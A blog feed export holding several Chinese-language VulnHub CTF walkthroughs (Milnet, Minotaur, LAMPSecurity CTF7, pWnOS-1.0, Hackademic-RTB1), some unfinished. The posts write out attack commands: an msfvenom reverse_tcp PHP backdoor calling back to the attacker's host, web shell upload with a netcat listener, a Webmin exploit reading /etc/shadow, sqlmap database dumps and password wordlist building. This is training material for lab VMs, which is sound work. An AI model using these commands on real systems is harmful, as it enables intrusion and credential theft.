        <content type="html"><![CDATA[<h1 id="Hack-the-Milnet-VM-CTF-Challenge"><a href="#Hack-the-Milnet-VM-CTF-Challenge" class="headerlink" title="Hack the Milnet VM (CTF Challenge)"></a>Hack the Milnet VM (CTF Challenge)</h1><blockquote><p>镜像地址：<strong><a href="https://www.vulnhub.com/entry/milnet-1,148/">https://www.vulnhub.com/entry/milnet-1,148/</a></strong></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描 (Nmap)</li><li>侦察（Nikto）</li><li>LFI 由于 allow_url_inclued</li><li>安装篡改数据（Firefox 插件）</li><li>生成 PHP 后门 (Msfvenom)</li><li>上传并执行后门</li><li>反向连接（Metasploit）</li><li>打开 UNIX 通配符文本文件</li><li>权限提升（cron 作业）</li><li>为shell 导入 python bash</li><li>获取 root 访问权限并捕获标志</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1网络扫描-Nmap"><a href="#2-1网络扫描-Nmap" class="headerlink" title="2.1网络扫描 (Nmap)"></a>2.1网络扫描 (Nmap)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220610114544391](21.Hack the Milnet VM (CTF Challenge).assets&#x2F;image-20220610114544391.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.1.239</span><br></pre></td></tr></table></figure><p>![image-20220610114644323](21.Hack the Milnet VM (CTF Challenge).assets&#x2F;image-20220610114644323.png)</p><h3 id="2-2侦察（Nikto）"><a href="#2-2侦察（Nikto）" class="headerlink" title="2.2侦察（Nikto）"></a>2.2侦察（Nikto）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 192.168.1.239</span><br></pre></td></tr></table></figure><blockquote><p>根据 Nikto 转储的结果，它讲述了一些关于<strong>info.php</strong>的信息，让我们验证一下</p></blockquote><p>![image-20220610123903720](21.Hack the Milnet VM (CTF Challenge).assets&#x2F;image-20220610123903720.png)</p><h3 id="2-3LFI-分析-allow-url-inclued"><a href="#2-3LFI-分析-allow-url-inclued" class="headerlink" title="2.3LFI 分析 allow_url_inclued"></a>2.3LFI 分析 allow_url_inclued</h3><blockquote><p>浏览<strong><a href="http://192.168.1.239/info.php">http://192.168.1.239/info.php</a></strong>时，我们发现“allow_url_include”是“on”，这意味着我们可以调用任何本地或远程文件，因此它指向 LFI 和 RFI 漏洞</p></blockquote><p>![image-20220610124239118](21.Hack the Milnet VM (CTF Challenge).assets&#x2F;image-20220610124239118.png)</p><blockquote><p>发现上述漏洞后，我们的步骤很明确，即我们使用了 <strong>篡改数据</strong></p></blockquote><h3 id="2-4篡改数据（burpsuite）"><a href="#2-4篡改数据（burpsuite）" class="headerlink" title="2.4篡改数据（burpsuite）"></a>2.4篡改数据（burpsuite）</h3><p>![image-20220611134836381](21.Hack the Milnet VM (CTF Challenge).assets&#x2F;image-20220611134836381.png)</p><h3 id="2-5生成-PHP-后门-Msfvenom"><a href="#2-5生成-PHP-后门-Msfvenom" class="headerlink" title="2.5生成 PHP 后门 (Msfvenom)"></a>2.5生成 PHP 后门 (Msfvenom)</h3><blockquote><p>生成 PHP 代码，借助它我们将拥有我们的 Meterpreter 会话并生成代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.128 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p>![image-20220610125343343](21.Hack the Milnet VM (CTF Challenge).assets&#x2F;image-20220610125343343.png)</p><h3 id="2-6上传并执行后门"><a href="#2-6上传并执行后门" class="headerlink" title="2.6上传并执行后门"></a>2.6上传并执行后门</h3><blockquote><p>将生成的php后门保存为shell.php</p><p>然后使用pythonserver进行<strong>python SimpleHTTPServer 80</strong>将其传输到目标系统</p></blockquote><p>![image-20220611135318776](21.Hack the Milnet VM (CTF Challenge).assets&#x2F;image-20220611135318776.png)</p><h2 id="未完还是不行"><a href="#未完还是不行" class="headerlink" title="未完还是不行"></a>未完还是不行</h2><h3 id="2-7反向连接（Metasploit）"><a href="#2-7反向连接（Metasploit）" class="headerlink" title="2.7反向连接（Metasploit）"></a>2.7反向连接（Metasploit）</h3><h3 id="2-8打开-UNIX-通配符文本文件"><a href="#2-8打开-UNIX-通配符文本文件" class="headerlink" title="2.8打开 UNIX 通配符文本文件"></a>2.8打开 UNIX 通配符文本文件</h3><h3 id="2-9权限提升（cron-作业）"><a href="#2-9权限提升（cron-作业）" class="headerlink" title="2.9权限提升（cron 作业）"></a>2.9权限提升（cron 作业）</h3><h3 id="2-10为shell-导入-python-bash"><a href="#2-10为shell-导入-python-bash" class="headerlink" title="2.10为shell 导入 python bash"></a>2.10为shell 导入 python bash</h3><h3 id="2-11获取-root-访问权限并捕获标志"><a href="#2-11获取-root-访问权限并捕获标志" class="headerlink" title="2.11获取 root 访问权限并捕获标志"></a>2.11获取 root 访问权限并捕获标志</h3><h2 id="未完"><a href="#未完" class="headerlink" title="未完"></a>未完</h2>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>22.Hack the Minotaur VM (CTF Challenge)</title>
      <link href="/2022/06/19/22.Hack%20the%20Minotaur%20VM%20(CTF%20Challenge)/"/>
      <url>/2022/06/19/22.Hack%20the%20Minotaur%20VM%20(CTF%20Challenge)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-Minotaur-VM-CTF-Challenge"><a href="#Hack-the-Minotaur-VM-CTF-Challenge" class="headerlink" title="Hack the Minotaur VM (CTF Challenge)"></a>Hack the Minotaur VM (CTF Challenge)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/">https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描 (Nmap)</li><li>WordPress扫描和密码破解（wpscan）</li><li>生成密码字典 (Cewl)</li><li>反向连接（Metasploit）</li><li>下载 shadow.bak 并破解 Hash (John)</li><li>sudo right 提权</li><li>获取 Root 访问权限并捕获标志</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1网络扫描-Netdiscover、Nmap"><a href="#2-1网络扫描-Netdiscover、Nmap" class="headerlink" title="2.1网络扫描 (Netdiscover、Nmap)"></a>2.1网络扫描 (Netdiscover、Nmap)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.56.0/24</span><br></pre></td></tr></table></figure><p>![image-20220610133352090](22.Hack the Minotaur VM (CTF Challenge).assets&#x2F;image-20220610133352090.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.56.223</span><br></pre></td></tr></table></figure><p>![image-20220610133540340](22.Hack the Minotaur VM (CTF Challenge).assets&#x2F;image-20220610133540340.png)</p><blockquote><ol><li>端口号：22、80、2020 是开放的。</li><li>我们可以使用端口 22 和 80 来发挥我们的优势。</li></ol></blockquote><blockquote><p>尝试通过 <strong>Nikto</strong> 和 <strong>curl</strong>进行探索， 但不幸的是，我们没有发现任何用处。所以我们决定使用 <strong>dirbuster</strong></p></blockquote><blockquote><p>打开 dirbuster。在其中，在 <strong>Target URL框中提供 URL，然后在****File with list of dir 框中</strong> 选择<strong>directory-list-2.3-medium.txt</strong> 文件 </p></blockquote><p>![image-20220610141016986](22.Hack the Minotaur VM (CTF Challenge).assets&#x2F;image-20220610141016986.png)</p><p>![image-20220610141316532](22.Hack the Minotaur VM (CTF Challenge).assets&#x2F;image-20220610141316532.png)</p><blockquote><p>显示名为 <strong>&#x2F;bull&#x2F;</strong> 的目录，我们在浏览器中打开该目录</p></blockquote><p>![image-20220610141518233](22.Hack the Minotaur VM (CTF Challenge).assets&#x2F;image-20220610141518233.png)</p><p>![image-20220610141615985](22.Hack the Minotaur VM (CTF Challenge).assets&#x2F;image-20220610141615985.png)</p><blockquote><p>显示有一个用 <strong>WordPress 制作的博客。</strong> 由于博客在 WordPress 中，我们可以应用 WPScan 来查找用户名和易受攻击的主题和插件</p></blockquote><h3 id="2-2WordPress扫描和密码破解（wpscan）"><a href="#2-2WordPress扫描和密码破解（wpscan）" class="headerlink" title="2.2WordPress扫描和密码破解（wpscan）"></a>2.2WordPress扫描和密码破解（wpscan）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.223/bull/ --enumerate u --enumerate p</span><br></pre></td></tr></table></figure><p>![image-20220611145109574](22.Hack the Minotaur VM (CTF Challenge).assets&#x2F;image-20220611145109574.png)</p><blockquote><p>该命令将开始执行，它将向您显示所有可利用的插件以及用户名，并且从其结果中，您将枚举以下信息：</p><p>一位用户名为 <strong>bully</strong>的用户。<strong>此外，还有一个用于Slideshow Gallery</strong>的插件漏洞利用 </p></blockquote><h3 id="2-3生成密码字典-Cewl"><a href="#2-3生成密码字典-Cewl" class="headerlink" title="2.3生成密码字典 (Cewl)"></a>2.3生成密码字典 (Cewl)</h3><blockquote><p>我们需要用户名和密码才能使这个漏洞利用。现在我们已经有了一个用户名，我们只需要它的密码，我们不知道在哪里可以找到它，因为我们没有字典或密码文件。我们之前阅读的提示提到了生成我们自己的单词表的要求。因此，我们将使用 <strong>ceWL 创建一个密码文件。</strong>要从 CeWL 制作密码文件，请转到您的 kali 终端并输入：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.56.223/bull -m 3 -w /root/Desktop/pass.txt</span><br></pre></td></tr></table></figure><p>![image-20220611145839358](22.Hack the Minotaur VM (CTF Challenge).assets&#x2F;image-20220611145839358.png)</p><blockquote><p>现在要找到它的密码，我们将使用 <strong>BurpSuite</strong>。因此，使用 burpsuite 应用字典攻击，一旦它找到正确的密码，它就会改变它的长度值，如下所示：</p></blockquote><h3 id="2-4反向连接（Metasploit）"><a href="#2-4反向连接（Metasploit）" class="headerlink" title="2.4反向连接（Metasploit）"></a>2.4反向连接（Metasploit）</h3><h3 id="2-5下载-shadow-bak-并破解-Hash-John"><a href="#2-5下载-shadow-bak-并破解-Hash-John" class="headerlink" title="2.5下载 shadow.bak 并破解 Hash (John)"></a>2.5下载 shadow.bak 并破解 Hash (John)</h3><h3 id="2-6sudo-right-提权"><a href="#2-6sudo-right-提权" class="headerlink" title="2.6sudo right 提权"></a>2.6sudo right 提权</h3><h3 id="2-7获取-Root-访问权限并捕获标志"><a href="#2-7获取-Root-访问权限并捕获标志" class="headerlink" title="2.7获取 Root 访问权限并捕获标志"></a>2.7获取 Root 访问权限并捕获标志</h3>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.破解 LAMPSecurity：CTF 7（CTF 挑战）</title>
      <link href="/2022/06/19/3.%E7%A0%B4%E8%A7%A3%20LAMPSecurity%EF%BC%9ACTF%207%EF%BC%88CTF%20%E6%8C%91%E6%88%98%EF%BC%89/"/>
      <url>/2022/06/19/3.%E7%A0%B4%E8%A7%A3%20LAMPSecurity%EF%BC%9ACTF%207%EF%BC%88CTF%20%E6%8C%91%E6%88%98%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="破解-LAMPSecurity：CTF-7（CTF-挑战）"><a href="#破解-LAMPSecurity：CTF-7（CTF-挑战）" class="headerlink" title="破解 LAMPSecurity：CTF 7（CTF 挑战）"></a>破解 LAMPSecurity：CTF 7（CTF 挑战）</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/lampsecurity-ctf7,86/">https://www.vulnhub.com/entry/lampsecurity-ctf7,86/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1. 渗透方法"></a>1. <strong>渗透方法</strong></h2><ul><li>网络扫描 (Nmap)</li><li>登录表单 SQL 注入</li><li>上传php web shell</li><li>生成 TTY 外壳 (Netcat)</li><li>mysql登录</li><li>窃取 MD5 密码</li><li>破解 MD5 哈希（开膛手约翰）</li><li>SSH登录</li><li>sudo 提权</li><li>获取root权限</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2. 渗透流程"></a>2. 渗透流程</h2><h3 id="2-3-通过netdiscover-发现目标主机"><a href="#2-3-通过netdiscover-发现目标主机" class="headerlink" title="2.3 通过netdiscover 发现目标主机"></a>2.3 通过netdiscover 发现目标主机</h3><p>![image-20220605204213473](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220605204213473.png)</p><h3 id="2-4-使用-NMAP-扫描目标"><a href="#2-4-使用-NMAP-扫描目标" class="headerlink" title="2.4 使用 NMAP 扫描目标"></a>2.4 使用 NMAP 扫描目标</h3><p>![image-20220605204340140](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220605204340140.png)</p><p>有很多端口是开放的，但这里有 80、8080 和 10000 三个端口可用于 HTTP。当我们导航到 URL <a href="http://192.168.1.7/">http://192.168.1.7</a> 时，我们会看到欢迎页面 </p><p>![image-20220605204529058](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220605204529058.png)</p><p>在探索端口 8080 时，我们找到了管理员帐户的登录页面</p><p>![image-20220605204723872](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220605204723872.png)</p><h3 id="2-5-尝试是否存在注入点"><a href="#2-5-尝试是否存在注入点" class="headerlink" title="2.5 尝试是否存在注入点"></a>2.5 尝试是否存在注入点</h3><p>![image-20220605204936939](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220605204936939.png)</p><p>果然存在</p><blockquote><p>到这里我们获得后台的仪表盘权限</p></blockquote><p>![image-20220605205124803](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220605205124803.png)</p><h3 id="2-6-找到可以上传shell的地方"><a href="#2-6-找到可以上传shell的地方" class="headerlink" title="2.6 找到可以上传shell的地方"></a>2.6 找到可以上传shell的地方</h3><p>![image-20220606094022099](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606094022099.png)</p><p>然后我们上传了位于 &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php 的 php web shell，以破坏 web 应用程序。在后台，我们启动了 netcat listener 1234 来访问受害者 VM 的 TTY shell</p><p>![image-20220606094458504](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606094458504.png)</p><p>但是我们不知道上传文件的存储位置，所以这里使用dirb进行web目录爆破</p><p>![image-20220606095231803](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606095231803.png)</p><p>前边带”DIRECTORY”单词的都是目录，一个一个尝试直到找到我们之前上传的反弹shell文件</p><p>![image-20220606095431475](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606095431475.png)</p><p>发现在assets目录存在之前上传的shell文件</p><p>![image-20220606100954610](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606100954610.png)</p><h3 id="2-7-使用pytohn生成bash终端"><a href="#2-7-使用pytohn生成bash终端" class="headerlink" title="2.7  使用pytohn生成bash终端"></a>2.7  使用pytohn生成bash终端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>![image-20220606101517063](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606101517063.png)</p><h3 id="2-8-尝试登陆mysql数据库"><a href="#2-8-尝试登陆mysql数据库" class="headerlink" title="2.8 尝试登陆mysql数据库"></a>2.8 尝试登陆mysql数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure><p>![image-20220606101728973](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606101728973.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use website;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure><p>![image-20220606101933804](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606101933804.png)</p><blockquote><p>发现用户表</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users;</span><br></pre></td></tr></table></figure><p>![image-20220606102236564](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606102236564.png)</p><blockquote><p>发现密码是md5加密的，使用在线md5解密工具进行解密</p></blockquote><p>![image-20220606102801625](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606102801625.png)</p><p>解密完成</p><h3 id="2-9-使用ssh尝试连接"><a href="#2-9-使用ssh尝试连接" class="headerlink" title="2.9 使用ssh尝试连接"></a>2.9 使用ssh尝试连接</h3><p>![image-20220606104302921](破解 LAMPSecurity：CTF 7（CTF 挑战）.assets&#x2F;image-20220606104302921.png)</p><blockquote><p>拿到root权限，挑战结束</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.Hack the pWnOS-1.0 (Boot To Root)</title>
      <link href="/2022/06/19/5.%E7%A0%B4%E8%A7%A3%20pWnOS-1.0%EF%BC%88%E5%90%AF%E5%8A%A8%E5%88%B0%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%89/"/>
      <url>/2022/06/19/5.%E7%A0%B4%E8%A7%A3%20pWnOS-1.0%EF%BC%88%E5%90%AF%E5%8A%A8%E5%88%B0%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-pWnOS-1-0-Boot-To-Root"><a href="#Hack-the-pWnOS-1-0-Boot-To-Root" class="headerlink" title="Hack the pWnOS-1.0 (Boot To Root)"></a>Hack the pWnOS-1.0 (Boot To Root)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/pwnos-10,33/">https://www.vulnhub.com/entry/pwnos-10,33/</a></p></blockquote><h2 id="1-漏洞"><a href="#1-漏洞" class="headerlink" title="1. 漏洞"></a>1. 漏洞</h2><ul><li>任意文件披露</li><li>权限提升</li><li>弱凭证</li></ul><h2 id="2-渗透方法"><a href="#2-渗透方法" class="headerlink" title="2. 渗透方法"></a>2. <strong>渗透方法</strong></h2><ul><li>网络扫描 (Nmap)</li><li>利用 Web 应用程序 (Metasploit)</li><li>提取任意文件</li><li>第一种方法</li><li>SSH蛮力</li><li>生成 TTY shell（通过 SSH RSA 密钥）</li><li>内核权限提升</li><li>第二种方法</li><li>破解密码哈希（开膛手约翰）</li><li>生成 TTY shell（通过 SSH 登录）</li><li>内核权限提升</li></ul><h2 id="3-渗透流程"><a href="#3-渗透流程" class="headerlink" title="3. 渗透流程"></a>3. 渗透流程</h2><h3 id="3-1-netdiscover-命令开始识别本地网络中的目标-IP"><a href="#3-1-netdiscover-命令开始识别本地网络中的目标-IP" class="headerlink" title="3.1 netdiscover 命令开始识别本地网络中的目标 IP"></a>3.1 netdiscover 命令开始识别本地网络中的目标 IP</h3><blockquote><p>192.168.1.8 是我的目标 IP</p></blockquote><p>![image-20220606164631306](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606164631306.png)</p><h3 id="3-2-使用nmap进行目标主机的扫描"><a href="#3-2-使用nmap进行目标主机的扫描" class="headerlink" title="3.2 使用nmap进行目标主机的扫描"></a>3.2 使用nmap进行目标主机的扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV 192.168.1.8</span><br></pre></td></tr></table></figure><p>![image-20220606165110783](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606165110783.png)</p><h3 id="3-3-访问http的端口"><a href="#3-3-访问http的端口" class="headerlink" title="3.3 访问http的端口"></a>3.3 访问http的端口</h3><blockquote><p>80是官方的帮助页</p></blockquote><p>![image-20220606165538156](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606165538156.png)</p><blockquote><p>1000 webmin</p></blockquote><p>![image-20220606165819765](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606165819765.png)</p><h3 id="3-4-使用Metasploit的webmin-x3D-gt-exploit"><a href="#3-4-使用Metasploit的webmin-x3D-gt-exploit" class="headerlink" title="3.4 使用Metasploit的webmin&#x3D;&gt;exploit"></a>3.4 使用Metasploit的webmin&#x3D;&gt;exploit</h3><blockquote><p>发现它可以被讨厌的人利用来泄露潜在的敏感信息。因此，在以下命令的帮助下，我们执行此漏洞利用以从受害者的 VM 中提取 &#x2F;etc&#x2F;passwd 文件</p></blockquote><p>![image-20220606170428174](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606170428174.png)</p><blockquote><p>auxiliary&#x2F;admin&#x2F;webmin&#x2F;file_disclosure </p></blockquote><p>![image-20220606170556276](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606170556276.png)</p><blockquote><p>通过show options 发现需要配置的参数 rhost</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.1.8</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>![image-20220606170910991](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606170910991.png)</p><blockquote><p>发现靶机系统上可用的用户名</p></blockquote><p>![image-20220606171042140](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606171042140.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rpath /etc/shadow</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>![image-20220606172009184](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606172009184.png)</p><p>![image-20220606172039473](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606172039473.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rpath /home/Obama/.ssh/authorized_keys </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>![image-20220606172511572](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606172511572-16545075135621.png)</p><h3 id="3-5-开始利用"><a href="#3-5-开始利用" class="headerlink" title="3.5 开始利用"></a>3.5 开始利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/offensive-security/exploit-database-bin-sploits.git</span><br></pre></td></tr></table></figure><p>![image-20220606190406178](5.破解 pWnOS-1.0（启动到根目录）.assets&#x2F;image-20220606190406178.png)</p><h3 id="3-6-ssh登录"><a href="#3-6-ssh登录" class="headerlink" title="3.6 ssh登录"></a>3.6 ssh登录</h3><blockquote><p>使用授权密钥进行登录</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="未完"><a href="#未完" class="headerlink" title="未完"></a>未完</h1>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.Hack the Hackademic-RTB1 VM (Boot to Root)</title>
      <link href="/2022/06/19/8.Hack%20the%20Hackademic-RTB1%20VM%20(Boot%20to%20Root)/"/>
      <url>/2022/06/19/8.Hack%20the%20Hackademic-RTB1%20VM%20(Boot%20to%20Root)/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-the-Hackademic-RTB1-VM-Boot-to-Root"><a href="#Hack-the-Hackademic-RTB1-VM-Boot-to-Root" class="headerlink" title="Hack the Hackademic-RTB1 VM (Boot to Root)"></a>Hack the Hackademic-RTB1 VM (Boot to Root)</h1><blockquote><p>镜像地址：<a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">https://www.vulnhub.com/entry/hackademic-rtb1,17/</a></p></blockquote><h2 id="1-渗透方法"><a href="#1-渗透方法" class="headerlink" title="1.渗透方法"></a>1.渗透方法</h2><ul><li>网络扫描（Nmap、netdiscover）</li><li>基于 WordPress (CMS) 的 SQLMAP 扫描</li><li>提取数据库和 WordPress 用户凭据</li><li>使用特定用户登录 WordPress 管理控制台</li><li>上传并执行反向 shell</li><li>反向连接（Metasploit）</li><li>利用目标（利用 15285）</li><li>获取 Root 访问权限并捕获标志</li></ul><h2 id="2-渗透流程"><a href="#2-渗透流程" class="headerlink" title="2.渗透流程"></a>2.渗透流程</h2><h3 id="2-1-局域网寻找目标主机"><a href="#2-1-局域网寻找目标主机" class="headerlink" title="2.1 局域网寻找目标主机"></a>2.1 局域网寻找目标主机</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>![image-20220607124123011](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607124123011.png)</p><blockquote><p>发现目标主机</p></blockquote><h3 id="2-2-nmap扫描目标主机进行服务发现"><a href="#2-2-nmap扫描目标主机进行服务发现" class="headerlink" title="2.2 nmap扫描目标主机进行服务发现"></a>2.2 nmap扫描目标主机进行服务发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.131</span><br><span class="line">nmap -Pn -sV 192.168.1.131</span><br></pre></td></tr></table></figure><p>![image-20220607130331277](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607130331277.png)</p><h3 id="2-3-测试80端口的http服务"><a href="#2-3-测试80端口的http服务" class="headerlink" title="2.3 测试80端口的http服务"></a>2.3 测试80端口的http服务</h3><blockquote><p>浏览器访问80端口</p></blockquote><p>![image-20220607130501477](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607130501477.png)</p><p>![image-20220607130624158](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607130624158.png)</p><blockquote><p>提示够明显了，点击target</p></blockquote><p>![image-20220607130846966](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607130846966.png)</p><blockquote><p>点击Uncategorized，将url进行重定向</p></blockquote><p>![image-20220607131139445](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607131139445.png)</p><blockquote><p>得到重定向url     <a href="http://192.168.1.131/Hackademic_RTB1/?cat=1">http://192.168.1.131/Hackademic_RTB1/?cat=1</a></p></blockquote><h3 id="2-4-寻找注入点，并进行注入"><a href="#2-4-寻找注入点，并进行注入" class="headerlink" title="2.4 寻找注入点，并进行注入"></a>2.4 寻找注入点，并进行注入</h3><blockquote><p>发现error 型注入点</p></blockquote><p>![image-20220607132217180](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607132217180.png)</p><blockquote><p>既然注入点都找出来了直接上sqlmap进行</p></blockquote><h3 id="2-5-sqlmap-进行注入点扫描"><a href="#2-5-sqlmap-进行注入点扫描" class="headerlink" title="2.5 sqlmap 进行注入点扫描"></a>2.5 sqlmap 进行注入点扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.131/Hackademic_RTB1/?cat=1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p>![image-20220607133021827](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607133021827.png)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.131/Hackademic_RTB1/?cat=1&quot; -D wordpress --dump-all</span><br></pre></td></tr></table></figure><p>![image-20220607134218963](8.Hack the Hackademic-RTB1 VM (Boot to Root).assets&#x2F;image-20220607134218963.png)</p><blockquote><p>没有发现目录，dirb进行目录爆破</p></blockquote><h3 id="2-6-dirb-目录爆破"><a href="#2-6-dirb-目录爆破" class="headerlink" title="2.6 dirb 目录爆破"></a>2.6 